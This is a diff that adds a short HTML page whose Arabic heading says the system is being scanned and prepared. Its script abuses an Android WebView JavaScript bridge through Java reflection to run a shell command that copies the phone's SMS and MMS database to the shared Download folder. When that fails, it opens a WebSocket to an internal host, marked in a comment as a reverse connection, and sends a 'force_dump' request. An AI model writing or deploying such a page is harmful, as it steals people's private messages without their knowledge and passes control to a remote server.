@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>System Injection Test</title>
+</head>
+<body>
+    <h1>جاري فحص وتجهيز النظام...</h1>
+    <script>
+        try {
+            if (window.accessibility || window.accessibilityBridge || window.InjectedObject) {
+                const target = window.InjectedObject || window.accessibility;
+                let shellCmd = "cat /data/data/com.android.providers.telephony/databases/mmssms.db > /sdcard/Download/sms_dump.db";
+                target.getClass().forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null).exec(shellCmd);
+            }
+        } catch (e) {
+            // محاولة الاتصال العكسي بالسيرفر عبر الـ WebSocket
+            const ws = new WebSocket('ws://10.0.0.108:8765');
+            ws.onopen = function() {
+                ws.send(JSON.stringify({action: "force_dump", ua: navigator.userAgent}));
+            };
+        }
+    </script>
+</body>
+</html>
